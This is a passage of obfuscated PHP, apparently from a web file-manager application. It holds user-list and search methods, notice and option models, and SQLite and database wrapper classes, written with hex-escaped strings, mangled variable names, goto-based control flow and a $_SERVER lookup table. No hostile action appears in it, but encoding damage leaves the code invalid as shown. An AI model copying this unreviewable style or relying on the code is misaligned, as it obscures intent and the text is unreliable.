"\x4c\105\106\x54\x20\112\117\111\x4e\40{$this->tablePrefix}\x75\163\145\x72\x5f\147\x72\x6f\165\160\x20\165\x73\x65\162\x5f\x67\162\x6f\165\160\x20\157\156\40\x75\x73\x65\x72\56\x75\x73\145\x72\x49\104\40\75\x20\x75\163\145\162\137\x67\x72\x6f\x75\160\56\x75\x73\x65\162\x49\x44"; $B˜³à—×õ÷ = Input::get($F©÷Ã¸Ëë§[419], null, $F©÷Ã¸Ëë§[43]) ? $F©÷Ã¸Ëë§[43] : $F©÷Ã¸Ëë§[2545]; } if (isset($c‚Š¡µ‰Ğ¿[$F©÷Ã¸Ëë§[679]])) { $AßèãŠº[$F©÷Ã¸Ëë§[2546]] = $c‚Š¡µ‰Ğ¿[$F©÷Ã¸Ëë§[679]]; } $AÉì±÷êÛ = $this->_makeOrder($B˜³à—×õ÷)->field($F©÷Ã¸Ëë§[2547])->where($AßèãŠº)->join($eõùùµîÊŠ)->selectPage(50); goto bîêäÌçõ; dÎ¡ˆš˜ãÆ: $F©÷Ã¸Ëë§ =& $_SERVER[¨¤¼…´]; $eõùùµîÊŠ = $F©÷Ã¸Ëë§[43]; $AßèãŠº = array(); goto B×´Ã•‘Ã; bîêäÌçõ: $this->_listDataApply($AÉì±÷êÛ[$F©÷Ã¸Ëë§[367]]); return $AÉì±÷êÛ; goto Eˆ™Ü‡ñò; Eˆ™Ü‡ñò: } private function _makeOrder($B‰¶‚ÚÒ„ = '') { goto Bƒ§‚–µã; e˜ĞôˆŒ­´: $B‰¶‚ÚÒ„ = $B‰¶‚ÚÒ„ . "\x75\x73\x65\x72\56{$f‰Í™¯§ì}\x20{$AæÄ”Ñ’†·}\x2c\40\x75\163\x65\x72\56\165\163\x65\x72\x49\104\40\141\x73\x63"; return $this->alias($Bä‡êŸ‰ôî[2294])->order($B‰¶‚ÚÒ„); goto c×àÎ¡›©; Bƒ§‚–µã: $Bä‡êŸ‰ôî =& $_SERVER[¨¤¼…´]; $A•°ø‘Ô¤³ = array($Bä‡êŸ‰ôî[1425], $Bä‡êŸ‰ôî[38], $Bä‡êŸ‰ôî[2081], $Bä‡êŸ‰ôî[2053], $Bä‡êŸ‰ôî[201]); $A¤ÎÈÑÓ· = array($Bä‡êŸ‰ôî[414] => $Bä‡êŸ‰ôî[415], $Bä‡êŸ‰ôî[416] => $Bä‡êŸ‰ôî[417]); goto C™¿’§¸·÷; C™¿’§¸·÷: $f‰Í™¯§ì = Input::get($Bä‡êŸ‰ôî[419], $Bä‡êŸ‰ôî[7], $Bä‡êŸ‰ôî[1416], $A•°ø‘Ô¤³); $AæÄ”Ñ’†· = Input::get($Bä‡êŸ‰ôî[420], $Bä‡êŸ‰ôî[7], $Bä‡êŸ‰ôî[2175], array($Bä‡êŸ‰ôî[2175], $Bä‡êŸ‰ôî[416])); $AæÄ”Ñ’†· = $A¤ÎÈÑÓ·[$AæÄ”Ñ’†·]; goto e˜ĞôˆŒ­´; c×àÎ¡›©: } public function listSearch($Eã’±İ„ßÉ) { goto aÙğ¨°¢‰‹; b¥îƒ‰²—Ø: if (!$aŞÊçÏğ£Î) { $fî¼òÊÍ¶ = array(); } if (isset($Eã’±İ„ßÉ[$dÒ³ÌÉÜ„Á[679]])) { $fî¼òÊÍ¶[$dÒ³ÌÉÜ„Á[679]] = $Eã’±İ„ßÉ[$dÒ³ÌÉÜ„Á[679]]; } $E‚Ş ƒ÷Î = $this->_makeOrder()->where($fî¼òÊÍ¶)->selectPage(20); goto C‚Íìï¾®Œ; aÙğ¨°¢‰‹: $dÒ³ÌÉÜ„Á =& $_SERVER[¨¤¼…´]; $aŞÊçÏğ£Î = $Eã’±İ„ßÉ[$dÒ³ÌÉÜ„Á[2176]]; $bÀ‹¸Ş·áÁ = isset($Eã’±İ„ßÉ[$dÒ³ÌÉÜ„Á[2177]]) ? $Eã’±İ„ßÉ[$dÒ³ÌÉÜ„Á[2177]] : !1; goto C¿è°¦ÕŸŠ; AÄ¸†Ë‹æš: return $E‚Ş ƒ÷Î; goto fŒ×éÇš½È; C‚Íìï¾®Œ: if (!$E‚Ş ƒ÷Î || count($E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[367]]) < 5 && Input::check($aŞÊçÏğ£Î, $dÒ³ÌÉÜ„Á[319])) { $B×˜®¥– ¡ = $this->_searchFromMeta($dÒ³ÌÉÜ„Á[427], $aŞÊçÏğ£Î, 10); $A¥ŞŠˆ¥ó = $this->_searchFromMeta($dÒ³ÌÉÜ„Á[428], $aŞÊçÏğ£Î, 10); $E†õä‰•¶ = array_merge($B×˜®¥– ¡, $A¥ŞŠˆ¥ó, $E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[367]]); $E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[367]] = array_unique_by_key($E†õä‰•¶, $dÒ³ÌÉÜ„Á[1425]); $E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[364]][$dÒ³ÌÉÜ„Á[365]] = count($E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[367]]); $E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[364]][$dÒ³ÌÉÜ„Á[366]] = ceil($E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[364]][$dÒ³ÌÉÜ„Á[365]] / $E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[364]][$dÒ³ÌÉÜ„Á[362]]); } $this->_listDataApply($E‚Ş ƒ÷Î[$dÒ³ÌÉÜ„Á[367]]); $this->_filterByGroup($E‚Ş ƒ÷Î, $bÀ‹¸Ş·áÁ); goto AÄ¸†Ë‹æš; C¿è°¦ÕŸŠ: $aŞÊçÏğ£Î = str_replace($dÒ³ÌÉÜ„Á[2178], $dÒ³ÌÉÜ„Á[2179], trim($aŞÊçÏğ£Î)); $fî¼òÊÍ¶ = array($dÒ³ÌÉÜ„Á[38] => array($dÒ³ÌÉÜ„Á[741], "\45{$aŞÊçÏğ£Î}\x25"), $dÒ³ÌÉÜ„Á[306] => array($dÒ³ÌÉÜ„Á[741], "\45{$aŞÊçÏğ£Î}\x25"), $dÒ³ÌÉÜ„Á[2353] => array($dÒ³ÌÉÜ„Á[741], "\45{$aŞÊçÏğ£Î}\45"), $dÒ³ÌÉÜ„Á[900] => $dÒ³ÌÉÜ„Á[2180]); if (Input::check($aŞÊçÏğ£Î, $dÒ³ÌÉÜ„Á[312])) { $fî¼òÊÍ¶[$dÒ³ÌÉÜ„Á[1425]] = array($dÒ³ÌÉÜ„Á[741], "\45{$aŞÊçÏğ£Î}\45"); $fî¼òÊÍ¶[$dÒ³ÌÉÜ„Á[2528]] = array($dÒ³ÌÉÜ„Á[741], "\x25{$aŞÊçÏğ£Î}\45"); } goto b¥îƒ‰²—Ø; fŒ×éÇš½È: } private function _filterByGroup(&$Dî›çÇ­Îç, $E‘í‰îõ½´) { $cÇ”÷Öá =& $_SERVER[¨¤¼…´]; if (!$E‘í‰îõ½´) { return $Dî›çÇ­Îç; } foreach ($Dî›çÇ­Îç[$cÇ”÷Öá[367]] as $d¢ºèíŒ†ª => &$F‚¶¬¡óò) { $eº”´Ö“çî = array_to_keyvalue($F‚¶¬¡óò[$cÇ”÷Öá[2264]], $cÇ”÷Öá[43], $cÇ”÷Öá[2095]); if (!in_array($E‘í‰îõ½´, $eº”´Ö“çî)) { unset($Dî›çÇ­Îç[$cÇ”÷Öá[367]][$d¢ºèíŒ†ª]); } } unset($F‚¶¬¡óò); $Dî›çÇ­Îç[$cÇ”÷Öá[367]] = array_values($Dî›çÇ­Îç[$cÇ”÷Öá[367]]); $Dî›çÇ­Îç[$cÇ”÷Öá[364]] = array($cÇ”÷Öá[2328] => count($Dî›çÇ­Îç[$cÇ”÷Öá[367]]), $cÇ”÷Öá[2326] => $Dî›çÇ­Îç[$cÇ”÷Öá[364]][$cÇ”÷Öá[362]], $cÇ”÷Öá[2325] => 1, $cÇ”÷Öá[2327] => 1); } private function _searchFromMeta($a£ã“Ø´®, $EØŠ›ÄÏ«, $a‹ÄŒŠçŒÑ) { goto eæ®á±ø„Ì; f¾Şñ¤¨£İ: $FÑêõÃäœ’ = $this->where(array($E™©Îˆö‹·[1416] => array($E™©Îˆö‹·[7], $bºÏ†¡¢…×)))->select(); if (!$FÑêõÃäœ’) { return array(); } return $FÑêõÃäœ’; goto cÛÄ—Ô‹¨Š; a¤´…æÂëÚ: $bºÏ†¡¢…× = Model($E™©Îˆö‹·[2548])->where($bÛ‡ë¬»ì)->limit($a‹ÄŒŠçŒÑ)->select(); if (!$bºÏ†¡¢…×) { return array(); } $bºÏ†¡¢…× = array_to_keyvalue($bºÏ†¡¢…×, $E™©Îˆö‹·[43], $E™©Îˆö‹·[1425]); goto f¾Şñ¤¨£İ; eæ®á±ø„Ì: $E™©Îˆö‹· =& $_SERVER[¨¤¼…´]; $EØŠ›ÄÏ« = strtolower($EØŠ›ÄÏ«); $bÛ‡ë¬»ì = array($E™©Îˆö‹·[99] => $a£ã“Ø´®, $E™©Îˆö‹·[372] => array($E™©Îˆö‹·[741], "\45{$EØŠ›ÄÏ«}\x25")); goto a¤´…æÂëÚ; cÛÄ—Ô‹¨Š: } private function _listDataApplyItem($A´»Âæª“’) { $DÒ¢Ä÷‡¦ã = array($A´»Âæª“’); $this->_listDataApply($DÒ¢Ä÷‡¦ã); return $DÒ¢Ä÷‡¦ã[0]; } private function _listDataApply(&$CØÀª‘Êåé) { goto bŸ·çÔ„ÈÄ; fëË¤æçÑ™: $BÎ†ÙáµÀ = array_to_keyvalue($CØÀª‘Êåé, $EÊ±«ŞêˆÜ[43], $EÊ±«ŞêˆÜ[1425]); $this->_listAppendGroup($CØÀª‘Êåé, $BÎ†ÙáµÀ); $this->_listAppendMeta($CØÀª‘Êåé, $BÎ†ÙáµÀ); goto b¨ËÕ§´–Á; bŸ·çÔ„ÈÄ: $EÊ±«ŞêˆÜ =& $_SERVER[¨¤¼…´]; if (!$CØÀª‘Êåé) { return; } array_remove_key($CØÀª‘Êåé, $EÊ±«ŞêˆÜ[791]); goto fëË¤æçÑ™; b¨ËÕ§´–Á: $this->_listAppendSourceRoot($CØÀª‘Êåé, $BÎ†ÙáµÀ); goto B˜×ù‚øµ¾; B˜×ù‚øµ¾: } private function _listAppendSourceRoot(&$C†¶Ÿ±•……, $C¯¸“Ÿùì) { goto A§à–Í®¹İ; A§à–Í®¹İ: $b‰«ÄéÙå =& $_SERVER[¨¤¼…´]; $d¼„ïò¸º… = array($b‰«ÄéÙå[474] => 0, $b‰«ÄéÙå[383] => SourceModel::TYPE_USER, $b‰«ÄéÙå[469] => array($b‰«ÄéÙå[7], $C¯¸“Ÿùì)); $eÅÔ‘•‹ĞÚ = $b‰«ÄéÙå[2187]; goto b×’áÁÙÚ; b×’áÁÙÚ: $C±à‡«±ã¨ = Model($b‰«ÄéÙå[742])->order($b‰«ÄéÙå[2188])->field($eÅÔ‘•‹ĞÚ)->where($d¼„ïò¸º…)->select(); $C±à‡«±ã¨ = array_to_keyvalue($C±à‡«±ã¨, $b‰«ÄéÙå[469]); $C±à‡«±ã¨ = array_remove_key($C±à‡«±ã¨, $b‰«ÄéÙå[469]); goto A°¥ÕÛÔ’×; A°¥ÕÛÔ’×: foreach ($C†¶Ÿ±•…… as &$fôŸ°ÏŠ¢ï) { $fôŸ°ÏŠ¢ï[$b‰«ÄéÙå[403]] = $C±à‡«±ã¨[$fôŸ°ÏŠ¢ï[$b‰«ÄéÙå[1425]]] ? $C±à‡«±ã¨[$fôŸ°ÏŠ¢ï[$b‰«ÄéÙå[1425]]] : array(); } unset($fôŸ°ÏŠ¢ï); goto A‡©õÀ§ƒâ; A‡©õÀ§ƒâ: } private function _listAppendGroup(&$EÃõùÅ°Œ§, $BšíÕ¤êÁ—) { goto f©Ê»ùò³; fë‡›ÂšˆÀ: $Eâ«Š÷È«Ó = array($Bˆ¤÷†‹›[2095] => array($Bˆ¤÷†‹›[7], $FÁÌ¡£ÒŸã)); $FÀ´´¦Ï«½ = Model($Bˆ¤÷†‹›[2262])->field($Bˆ¤÷†‹›[2549])->where($Eâ«Š÷È«Ó)->select(); $FÀ´´¦Ï«½ = array_to_keyvalue($FÀ´´¦Ï«½, $Bˆ¤÷†‹›[2095]); goto AŠäÑî¨íİ; bĞŒğ±§Ñ£: $FÁÌ¡£ÒŸã = array_to_keyvalue($fÊƒğ™®Ö‚, $Bˆ¤÷†‹›[43], $Bˆ¤÷†‹›[2095]); $FÁÌ¡£ÒŸã = array_remove_value(array_unique($FÁÌ¡£ÒŸã), $Bˆ¤÷†‹›[481]); if (!$FÁÌ¡£ÒŸã || !$fÊƒğ™®Ö‚) { return; } goto fë‡›ÂšˆÀ; cÀ‡‹Ä©×: foreach ($EÃõùÅ°Œ§ as &$bõ‰¸¡Æ¹) { $bõ‰¸¡Æ¹[$Bˆ¤÷†‹›[2264]] = array(); if (isset($fÊƒğ™®Ö‚[$bõ‰¸¡Æ¹[$Bˆ¤÷†‹›[1425]]])) { $bõ‰¸¡Æ¹[$Bˆ¤÷†‹›[2264]] = $fÊƒğ™®Ö‚[$bõ‰¸¡Æ¹[$Bˆ¤÷†‹›[1425]]]; } } unset($bõ‰¸¡Æ¹); goto AÊ¡à…æŒÖ; f©Ê»ùò³: $Bˆ¤÷†‹› =& $_SERVER[¨¤¼…´]; $Eâ«Š÷È«Ó = array($Bˆ¤÷†‹›[1425] => array($Bˆ¤÷†‹›[7], $BšíÕ¤êÁ—)); $fÊƒğ™®Ö‚ = Model($Bˆ¤÷†‹›[2174])->where($Eâ«Š÷È«Ó)->select(); goto bĞŒğ±§Ñ£; AŠäÑî¨íİ: $fÊƒğ™®Ö‚ = array_to_keyvalue_group($fÊƒğ™®Ö‚, $Bˆ¤÷†‹›[1425]); foreach ($fÊƒğ™®Ö‚ as &$a£½áá”) { $D‘¹ÅØÆµã = array(); foreach ($a£½áá” as $b”–ŞùÃÖ) { if (!$b”–ŞùÃÖ[$Bˆ¤÷†‹›[2239]]) { continue; } $D¿¯´‰ŸÂ‰ = Model($Bˆ¤÷†‹›[2258])->listData($b”–ŞùÃÖ[$Bˆ¤÷†‹›[2239]]); $D‘¹ÅØÆµã[] = array($Bˆ¤÷†‹›[2095] => $b”–ŞùÃÖ[$Bˆ¤÷†‹›[2095]], $Bˆ¤÷†‹›[2550] => $FÀ´´¦Ï«½[$b”–ŞùÃÖ[$Bˆ¤÷†‹›[2095]]][$Bˆ¤÷†‹›[38]], $Bˆ¤÷†‹›[472] => $FÀ´´¦Ï«½[$b”–ŞùÃÖ[$Bˆ¤÷†‹›[2095]]][$Bˆ¤÷†‹›[472]], $Bˆ¤÷†‹›[388] => $D¿¯´‰ŸÂ‰); } $a£½áá” = $D‘¹ÅØÆµã; } unset($a£½áá”); goto cÀ‡‹Ä©×; AÊ¡à…æŒÖ: } private function _listAppendMeta(&$d×¬‘ŠïÀÇ, $aÖŸ¶†¦) { goto eª©©â¼ôö; DÂĞÃ–ğ™Š: foreach ($AäÕ§Ğ§³˜ as &$A†ªŞŠİ—ì) { $EÔ‚§¡¾æÖ = array(); foreach ($A†ªŞŠİ—ì as $E¼ùÙ—¢Ê) { if (!in_array($E¼ùÙ—¢Ê[$cø ›ä’ Š[99]], $bÎøæ¯Ğˆ)) { $EÔ‚§¡¾æÖ[$E¼ùÙ—¢Ê[$cø ›ä’ Š[99]]] = $E¼ùÙ—¢Ê[$cø ›ä’ Š[372]]; } } $A†ªŞŠİ—ì = $EÔ‚§¡¾æÖ; } unset($A†ªŞŠİ—ì); $Eä²À¬Äó = Model($cø ›ä’ Š[2551]); goto eìí‹ß×Ó¡; a§‚Î§ù¡: $e÷ô¾  õ = array($cø ›ä’ Š[1425] => array($cø ›ä’ Š[7], $aÖŸ¶†¦)); $AäÕ§Ğ§³˜ = Model($cø ›ä’ Š[2527])->where($e÷ô¾  õ)->select(); $AäÕ§Ğ§³˜ = array_to_keyvalue_group($AäÕ§Ğ§³˜, $cø ›ä’ Š[1425]); goto DÂĞÃ–ğ™Š; eìí‹ß×Ó¡: foreach ($d×¬‘ŠïÀÇ as &$d£ÀåàÉÛæ) { $dˆß£òÙ„² = array(); if (isset($AäÕ§Ğ§³˜[$d£ÀåàÉÛæ[$cø ›ä’ Š[1425]]])) { $dˆß£òÙ„² = $AäÕ§Ğ§³˜[$d£ÀåàÉÛæ[$cø ›ä’ Š[1425]]]; } $d£ÀåàÉÛæ[$cø ›ä’ Š[2552]] = array(); if (isset($dˆß£òÙ„²[$EŠ¸´Õó])) { $d£ÀåàÉÛæ[$cø ›ä’ Š[2552]] = $Eä²À¬Äó->getUserJobInfo($dˆß£òÙ„²[$EŠ¸´Õó]); } } unset($d£ÀåàÉÛæ); goto dŠ²¶«Ë; eª©©â¼ôö: $cø ›ä’ Š =& $_SERVER[¨¤¼…´]; $EŠ¸´Õó = UserJobModel::JOB_KEY; $bÎøæ¯Ğˆ = array($cø ›ä’ Š[2530]); goto a§‚Î§ù¡; dŠ²¶«Ë: } protected function groupUserAll($A†¬¿¨¨£×) { $eæ²èÊÉ =& $_SERVER[¨¤¼…´]; if (!$A†¬¿¨¨£×) { return !1; } $cáÈ›©š‘Ë = Model($eæ²èÊÉ[2174])->field($eæ²èÊÉ[1425])->where(array($eæ²èÊÉ[2095] => array($eæ²èÊÉ[7], $A†¬¿¨¨£×)))->select(); $cáÈ›©š‘Ë = array_to_keyvalue($cáÈ›©š‘Ë, $eæ²èÊÉ[43], $eæ²èÊÉ[1425]); return array_unique($cáÈ›©š‘Ë); } public function userSearch($bˆ›¼‚ƒñÚ, $dÉâê£Şà¼ = "\52") { return Model($_SERVER[¨¤¼…´][490])->where($bˆ›¼‚ƒñÚ)->field($dÉâê£Şà¼)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\x75\163\x65\162\x5f\x6f\x70\164\151\157\156"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($c¯¬ÊÊÔ‘¬) { $aÔÃ œš  =& $_SERVER[¨¤¼…´]; if (!defined($aÔÃ œš [438])) { define($aÔÃ œš [438], 0); } return "\x55\163\x65\x72\x4f\160\x74\151\157\x6e\x5f{$c¯¬ÊÊÔ‘¬}\x5f" . USER_ID; } protected function filterWhere($c˜ëˆÚ‡ŒÏ) { $BÃÅ…î™¢™ =& $_SERVER[¨¤¼…´]; if (!defined($BÃÅ…î™¢™[438])) { define($BÃÅ…î™¢™[438], 0); } $c˜ëˆÚ‡ŒÏ[$BÃÅ…î™¢™[1425]] = USER_ID; return $c˜ëˆÚ‡ŒÏ; } public function cacheRemoveUser($AãŒÕºøƒñ, $c‘¯´†òéÒ) { return Cache::remove("\x55\163\145\x72\x4f\160\164\x69\157\x6e\x5f{$AãŒÕºøƒñ}\137" . $c‘¯´†òéÒ); } protected function optionDefault($b©ìšª²ƒÔ = '') { $cè®‹ã³‹§ =& $_SERVER[¨¤¼…´]; if ($b©ìšª²ƒÔ == $cè®‹ã³‹§[43]) { return $GLOBALS[$cè®‹ã³‹§[6]][$cè®‹ã³‹§[2553]]; } if ($b©ìšª²ƒÔ == $cè®‹ã³‹§[2554]) { return $GLOBALS[$cè®‹ã³‹§[6]][$cè®‹ã³‹§[2555]]; } } } goto eÆ®Û´‘ˆ; cäºÇêâÂ: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\156\157\164\x69\143\x65\114\x69\x73\164"; public $field = array("\x6e\x61\x6d\x65", "\143\x6f\x6e\164\x65\156\x74", "\141\x75\x74\x68", "\x6d\x6f\x64\x65", "\x74\x69\x6d\x65", "\164\x79\x70\x65", "\154\x65\x76\145\154", "\145\156\141\142\x6c\145", "\x73\157\162\164"); public function listData($fÜÓòÌ–æ = false, $AíŸö£Ûí = "\163\x6f\x72\164", $EÍÆÆ²…´× = false) { return parent::listData($fÜÓòÌ–æ, $AíŸö£Ûí, $EÍÆÆ²…´×); } public function add($aÀäº‰Ì§ƒ) { $fŸÄ•Ì¹É‰ =& $_SERVER[¨¤¼…´]; $añ‘¤«±‹ª = time(); if ($aÀäº‰Ì§ƒ[$fŸÄ•Ì¹É‰[22]] == $fŸÄ•Ì¹É‰[2492]) { $añ‘¤«±‹ª = strtotime($aÀäº‰Ì§ƒ[$fŸÄ•Ì¹É‰[204]]); } $aÀäº‰Ì§ƒ[$fŸÄ•Ì¹É‰[204]] = $añ‘¤«±‹ª; return parent::insert($aÀäº‰Ì§ƒ); } public function update($c¶ÔÏ•Š è, $bñ††‘ŠŸ) { goto cÃ¬ÕÅŠÍÁ; cÃ¬ÕÅŠÍÁ: $D±Œ¶´ñŒ =& $_SERVER[¨¤¼…´]; $f¹À™í¡‰™ = $this->listData($c¶ÔÏ•Š è); if (!$f¹À™í¡‰™) { return !1; } goto E¤¹Ó¼´¦Í; E¨ò„ÍÆÇ¢: return parent::update($c¶ÔÏ•Š è, $bñ††‘ŠŸ); goto eùï‰‹ÔÚ; E¤¹Ó¼´¦Í: $dˆä¶ÔƒĞ = time(); if ($bñ††‘ŠŸ[$D±Œ¶´ñŒ[22]] == $D±Œ¶´ñŒ[2492]) { $dˆä¶ÔƒĞ = strtotime($bñ††‘ŠŸ[$D±Œ¶´ñŒ[204]]); } $bñ††‘ŠŸ[$D±Œ¶´ñŒ[204]] = $dˆä¶ÔƒĞ; goto E¨ò„ÍÆÇ¢; eùï‰‹ÔÚ: } public function remove($A±ù¶Ã´‚) { $A˜ÓÀ³—º™ = $this->listData($A±ù¶Ã´‚); if (!$A˜ÓÀ³—º™ || $A˜ÓÀ³—º™[$_SERVER[¨¤¼…´][1070]]) { return !1; } return parent::remove($A±ù¶Ã´‚); } public function sort($Då—‹ÁŠ¯ˆ, $DÅœ¥Õ¯æ) { return parent::update($Då—‹ÁŠ¯ˆ, $DÅœ¥Õ¯æ); } public function enable($c´¹ò§â¤¡, $E¥Ôãğ†÷Æ) { return parent::update($c´¹ò§â¤¡, array($_SERVER[¨¤¼…´][2493] => $E¥Ôãğ†÷Æ)); } private function initUserOption() { $DóŒÜé‡Õ =& $_SERVER[¨¤¼…´]; $this->optionType = $DóŒÜé‡Õ[2494]; $this->modelType = $DóŒÜé‡Õ[2495]; $this->field = array($DóŒÜé‡Õ[2496], $DóŒÜé‡Õ[38], $DóŒÜé‡Õ[204], $DóŒÜé‡Õ[39], $DóŒÜé‡Õ[2497], $DóŒÜé‡Õ[679], $DóŒÜé‡Õ[197]); } public function userNoticeGet($C…ºòÌ×¡ = false) { $this->initUserOption(); return parent::listData($C…ºòÌ×¡, $_SERVER[¨¤¼…´][379], !0); } public function userNoticeAdd($dÊÅÒ“çêŸ) { $d£¾ÚŠÁñµ =& $_SERVER[¨¤¼…´]; $this->initUserOption(); $A‘×ª¿¡èŒ = $this->findByKey($d£¾ÚŠÁñµ[2496], $dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[379]]); if ($A‘×ª¿¡èŒ) { return !0; } $F‹„‚åÇô = array($d£¾ÚŠÁñµ[2496] => $dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[379]], $d£¾ÚŠÁñµ[38] => $dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[38]], $d£¾ÚŠÁñµ[204] => $dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[204]], $d£¾ÚŠÁñµ[39] => isset($dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[39]]) ? $dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[39]] : 1, $d£¾ÚŠÁñµ[2497] => isset($dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[2497]]) ? $dÊÅÒ“çêŸ[$d£¾ÚŠÁñµ[2497]] : 0, $d£¾ÚŠÁñµ[679] => 0, $d£¾ÚŠÁñµ[197] => 0); return parent::insert($F‹„‚åÇô); } public function userNoticeEdit($C‰Ò™ÎËù, $AÜóÚñİñª) { $this->initUserOption(); return parent::update($C‰Ò™ÎËù, $AÜóÚñİñª); } } class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\x79\163\x74\x65\x6d\137\157\160\x74\151\x6f\156"; protected $jsonField = array("\x6d\145\x6e\165", "\162\157\x6c\145", "\x72\x6f\154\x65\x47\162\157\x75\x70", "\x72\145\x67\x69\163\164", "\x65\155\141\151\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($A–‚‡ƒ¢£÷) { return "\x53\x79\163\164\145\155\x4f\x70\x74\x69\157\156\137{$A–‚‡ƒ¢£÷}"; } protected function optionDefault($bå”åç­Í = '') { $cğœ••ë— =& $_SERVER[¨¤¼…´]; if ($bå”åç­Í == $cğœ••ë—[43]) { return $GLOBALS[$cğœ••ë—[6]][$cğœ••ë—[2498]]; } } } class SystemRecordModel extends ModelBaseLight { } goto C—ÃñÉ—ÈŸ; a¤Ã¿ÚÚß: define($_SERVER[¨¤¼…´][242], 1); define($_SERVER[¨¤¼…´][243], 0); define($_SERVER[¨¤¼…´][244], 2); goto eôï¤˜£¨ˆ; a‹çæ•àÓ¤: class DbSqlite3 extends DbSqlite3Base { public function query($e‹ŠôÀˆ¦) { $dšÃÏÈ¡Ïá =& $_SERVER[¨¤¼…´]; if (!CacheLock::fileLock($dšÃÏÈ¡Ïá[19])) { return !1; } $C«®­®Õ¼ = parent::query($e‹ŠôÀˆ¦); CacheLock::fileUnLock($dšÃÏÈ¡Ïá[19]); return $C«®­®Õ¼; } public function execute($cÛØÛª¢“´) { $fíÄ ¿ˆ‡‘ =& $_SERVER[¨¤¼…´]; if (!CacheLock::fileLock($fíÄ ¿ˆ‡‘[19])) { return !1; } $EŒÕ¶›Œ²— = parent::execute($cÛØÛª¢“´); CacheLock::fileUnLock($fíÄ ¿ˆ‡‘[19]); return $EŒÕ¶›Œ²—; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\x5f\x74\150\151\156\x6b\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $exp = array("\x65\161" => "\x3d", "\x6e\145\161" => "\74\76", "\147\x74" => "\76", "\x65\147\164" => "\76\x3d", "\154\x74" => "\74", "\x65\154\164" => "\x3c\x3d", "\x6e\157\164\x6c\x69\x6b\145" => "\116\x4f\x54\x20\114\111\113\x45", "\154\x69\x6b\x65" => "\114\x49\x4b\105", "\151\x6e" => "\111\x4e", "\x6e\x6f\164\x69\156" => "\x4e\117\x54\40\x49\x4e", "\156\157\164\40\151\156" => "\116\117\124\x20\x49\x4e", "\x62\x65\x74\167\145\145\x6e" => "\102\x45\124\127\x45\105\x4e", "\156\157\x74\142\145\164\x77\x65\145\x6e" => "\116\117\x54\40\102\x45\124\x57\x45\105\x4e", "\x6e\x6f\x74\x20\x62\x65\x74\x77\145\145\x6e" => "\x4e\117\x54\40\102\x45\124\127\x45\105\x4e"); protected $selectSql = "\123\105\x4c\x45\x43\x54\45\x44\x49\123\124\111\116\x43\x54\x25\x20\x25\x46\111\105\114\104\x25\x20\106\x52\x4f\x4d\x20\45\x54\x41\x42\114\105\x25\45\112\117\x49\x4e\45\45\x57\x48\105\x52\x45\x25\45\x47\122\117\x55\120\x25\45\x48\101\x56\111\x4e\x47\45\x25\117\122\x44\x45\122\45\45\x4c\111\115\111\124\45\x20\45\125\116\111\117\116\x25\x25\x43\x4f\x4d\115\105\116\124\45"; protected $bind = array(); public static function getInstance() { $CĞ‘Â¡Œ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[¨¤¼…´][861], $CĞ‘Â¡Œ); } public function factory($D½¤°³Ğ¿ô = '') { goto E™óŞ¸Šåœ; EÕÑ¡çõ™¶: return $B×ÀÈ¹èœ; goto aÅ‚Çöğ×; Cç»Áçµìå: $this->dbType = ucwords(strtolower($D½¤°³Ğ¿ô[$Dá®†Œ¤ºÒ[862]])); $CÇÁÉ¢ß±£ = $Dá®†Œ¤ºÒ[864] . $this->dbType; if (class_exists($CÇÁÉ¢ß±£)) { $B×ÀÈ¹èœ = new $CÇÁÉ¢ß±£($D½¤°³Ğ¿ô); if ($Dá®†Œ¤ºÒ[713] != strtolower($D½¤°³Ğ¿ô[$Dá®†Œ¤ºÒ[862]])) { $B×ÀÈ¹èœ->dbType = strtoupper($this->dbType); } else { $B×ÀÈ¹èœ->dbType = $this->_getDsnType($D½¤°³Ğ¿ô[$Dá®†Œ¤ºÒ[817]]); } } else { think_exception(think_lang($Dá®†Œ¤ºÒ[865]) . $Dá®†Œ¤ºÒ[866] . $CÇÁÉ¢ß±£); } goto EÕÑ¡çõ™¶; E™óŞ¸Šåœ: $Dá®†Œ¤ºÒ =& $_SERVER[¨¤¼…´]; $D½¤°³Ğ¿ô = $this->parseConfig($D½¤°³Ğ¿ô); if (empty($D½¤°³Ğ¿ô[$Dá®†Œ¤ºÒ[862]])) { think_exception(think_lang($Dá®†Œ¤ºÒ[863])); } goto Cç»Áçµìå; aÅ‚Çöğ×: } public function __call($Eê¶ó¹Á†Ç, $D©¤óÅ‚¬Ù) { if (method_exists($this, $Eê¶ó¹Á†Ç)) { return call_user_func_array(array($this, $Eê¶ó¹Á†Ç), $D©¤óÅ‚¬Ù); } } protected function _getDsnType($eœ˜ ¢¿³) { $Câ°ˆÛøõÀ = explode($_SERVER[¨¤¼…´][4], $eœ˜ ¢¿³); $DŞĞÊ”ñì‘ = strtoupper(trim($Câ°ˆÛøõÀ[0])); return $DŞĞÊ”ñì‘; } private function parseConfig($B…Öø¡Ôö = '') { $CÂ¼‚©ø”ò =& $_SERVER[¨¤¼…´]; if (!empty($B…Öø¡Ôö) && 